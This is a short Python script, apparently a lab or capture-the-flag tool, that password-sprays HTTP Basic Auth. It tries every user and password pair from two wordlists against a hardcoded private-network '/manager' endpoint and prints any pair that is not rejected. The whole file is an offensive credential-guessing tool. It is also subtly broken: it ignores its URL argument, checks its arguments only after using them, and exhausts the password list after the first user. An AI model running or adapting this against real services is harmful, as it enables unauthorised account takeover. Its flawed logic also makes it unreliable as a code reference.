from os import popen
from sys import argv, stdout
from requests.auth import HTTPBasicAuth
from requests import get

print("Simple HTTP Auth Password Sprayer")
print("by disastrpc @ github.com/disastrpc")

userlist = open(argv[1], 'r')
passwdlist = open(argv[2], 'r')

target = argv[3]

if(len(argv) != 4):
    print(f"Usage: {argv[0]} [Userlist] [Wordlist] [URL]")
    exit(1)

try:
    for user in userlist:
        for passwd in passwdlist:
            print(f"Testing {user.strip()} : {passwd.strip()}")
            r = get('http://10.1.62.49:8080/manager', auth=(user.strip(),passwd.strip()))
            if(r.status_code != 401):
                print(f"Found match {user.strip()}:{passwd.strip()}")
                break
except:
    pass

userlist.close()
passwdlist.close()